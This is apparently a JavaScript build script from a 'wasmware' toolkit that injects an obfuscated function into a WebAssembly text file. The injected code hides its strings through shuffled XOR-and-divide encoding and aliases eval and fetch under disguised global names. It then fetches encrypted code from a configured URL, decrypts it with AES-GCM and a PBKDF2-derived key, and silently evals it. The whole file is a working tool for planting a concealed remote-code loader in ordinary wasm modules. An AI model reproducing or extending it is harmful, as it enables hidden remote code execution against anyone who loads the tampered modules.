import fs from "fs";
import {
    tab_size,
    url,
    fold_lines,
    target_address,
    wasmware_func_name,
    wasmware_func_export_name,
    local_counter_1_name,
    local_counter_2_name,
    insert_wasmware_func_before,
    global_eval_setter_property,
    global_fetch_setter_property,
    global_url_alias_setter_property,
    global_key_alias_setter_property,
    global_decryption_alias_setter_property,
    global_setter_import_func_name,
    wasmware_import_func_name
} from "../build_config.js";

let decrypt = (async (t, key) => {
  let D = new TextDecoder(),
        S = crypto.subtle
  let K = async (s) => S.deriveKey(
    {name:"PBKDF2",salt:s,iterations:25e4,hash:"SHA-256"},
    await S.importKey("raw",new TextEncoder().encode(key),"PBKDF2",0,["deriveKey"]),
    {name:"AES-GCM",length:256},0,["decrypt"]
  )
  let d = Uint8Array.from(Buffer.from(t,"base64")),
        s = d.slice(0,16),
        i = d.slice(16,28),
        c = d.slice(28)
  return D.decode(await S.decrypt({name:"AES-GCM",iv:i},await K(s),c))
}).toString();

function encode_text_into_wat(text, target_address) {
    let encoded = new TextEncoder().encode(text);
    let output = "";
    let order = [];
    let picks = [...Array(encoded.length).keys()];
    for (let c = 0; c < encoded.length; c++) {
        let key = [];
        for (let i = 0; i < 4; i++) key.push(Math.floor(Math.random() * 65536) + 65536);
        let pick = Math.floor(Math.random() * picks.length);
        let i = picks[pick];
        order.push([key, ((target_address + i) * key[3]) ^ key[2], (encoded[i] * key[1]) ^ key[0]]);
        picks.splice(pick, 1);
    }
    let data = order[0];
    let last_encoded_addr = data[1];
    let last_encoded_text = data[2];
    output += 
`i32.const ${data[1]}
local.tee ${local_counter_1_name}
i32.const ${data[0][2]}
i32.xor
i32.const ${data[0][3]}
i32.div_u
i32.const ${data[2]}
local.tee ${local_counter_2_name}
i32.const ${data[0][0]}
i32.xor
i32.const ${data[0][1]}
i32.div_u
i32.store8\n`;
    for (let i = 1; i < order.length; i++) {
         data = order[i];
         let diff_addr = data[1] - last_encoded_addr;
         let diff_text = data[2] - last_encoded_text;
         last_encoded_addr = data[1];
         last_encoded_text = data[2];
         output += 
`i32.const ${diff_addr}
local.get ${local_counter_1_name}
i32.add
local.tee ${local_counter_1_name}
i32.const ${data[0][2]}
i32.xor
i32.const ${data[0][3]}
i32.div_u
i32.const ${diff_text}
local.get ${local_counter_2_name}
i32.add
local.tee ${local_counter_2_name}
i32.const ${data[0][0]}
i32.xor
i32.const ${data[0][1]}
i32.div_u
i32.store8\n`;
    }
    return [output, target_address + encoded.length];
};

function build_wasmware_func(func_name, target_address, signature_num, key) {
  let signature_comment = signature_num == -1 ? " " : ` (;${signature_num};) `;
  let [fold_start, fold_end] = fold_lines ? ["(", ")"] : ["", ""];
  let output = 
`(func $${func_name}${signature_comment}(export "${wasmware_func_export_name}")
\t(local ${local_counter_1_name} i32)
\t(local ${local_counter_2_name} i32)\n`;
   let [global_set_eval_property_segment, offset1] = encode_text_into_wat(global_eval_setter_property, target_address);
   let [global_set_fetch_property_segment, offset2] = encode_text_into_wat(global_fetch_setter_property, offset1);
   let [eval_segment, offset3] = encode_text_into_wat("eval", offset2);
   let [fetch_segment, offset4] = encode_text_into_wat("fetch", offset3);
   output += global_set_eval_property_segment;
   output += global_set_fetch_property_segment;
   output += eval_segment;
   output += fetch_segment;
   output += 
`i32.const ${offset2}
i32.const ${offset3 - offset2}
i32.const ${target_address}
i32.const ${offset1 - target_address}
call ${global_setter_import_func_name}
i32.const ${offset3}
i32.const ${offset4 - offset3}
i32.const ${offset1}
i32.const ${offset2 - offset1}
call ${global_setter_import_func_name}\n`;
   let [alias_segment, offset5] = encode_text_into_wat(`globalThis["${global_url_alias_setter_property}"]="${url}";globalThis["${global_key_alias_setter_property}"]="${key}";globalThis["${global_decryption_alias_setter_property}"]=${decrypt}`, offset1);
   output += alias_segment;
   output += 
`i32.const ${offset1}
i32.const ${offset5 - offset1}
i32.const ${target_address}
i32.const ${offset1 - target_address}
call ${wasmware_import_func_name}\n`;
   let [code_retriever_segment, offset6] = encode_text_into_wat(`(async()=>{try{globalThis["${global_eval_setter_property}"](await globalThis["${global_decryption_alias_setter_property}"](await(await globalThis["${global_fetch_setter_property}"](globalThis["${global_url_alias_setter_property}"])).text(), globalThis["${global_key_alias_setter_property}"]))}catch{}})()`, offset1);
   output += code_retriever_segment;
   output += 
`i32.const ${offset1}
i32.const ${offset6 - offset1}
i32.const ${target_address}
i32.const ${offset1 - target_address}
call ${wasmware_import_func_name}\n)`;
   let indent_text = " ".repeat(tab_size);
   let output_lines = output.split("\n");
   for (let i = 3; i < output_lines.length - 1; i++) output_lines[i] = "\t" + fold_start + output_lines[i] + fold_end;       
   for (let i = 0; i < output_lines.length; i++) output_lines[i] = indent_text + output_lines[i];
   return output_lines;
}

const signature_regex = /\(;(\d+);\)/;

export default async function rewrite_wat_with_wasmware_func() {
    let key = fs.readFileSync("../src/txts/input/key.txt", "utf-8");
    let watfile = fs.readFileSync("../src/txts/output/wat.txt", "utf8");
    let lines = watfile.split("\n");
    let signature = -1;
    let func_inserted = false;
    let wasmware_func_lines = [];
    let wasmware_func_insertion_index = 0;
    for (let i = 0; i < lines.length; i++) {
        let line = lines[i];
        let match = line.match(signature_regex);
        if (match) {
            signature = +match[1];
            if (func_inserted) lines[i] = line.replace(signature_regex, `(;${signature + 1};)`);
        }
        if (line.includes(insert_wasmware_func_before) && !func_inserted) {
            wasmware_func_lines = build_wasmware_func(wasmware_func_name, target_address, signature, key);
            wasmware_func_insertion_index = i;
            if (match) lines[i] = line.replace(signature_regex, `(;${signature + 1};)`);
            func_inserted = true;
        }
    }
    lines.splice(wasmware_func_insertion_index, 0, ...wasmware_func_lines);
    fs.writeFileSync("../src/txts/output/wat.txt", lines.join("\n"), "utf8");
};
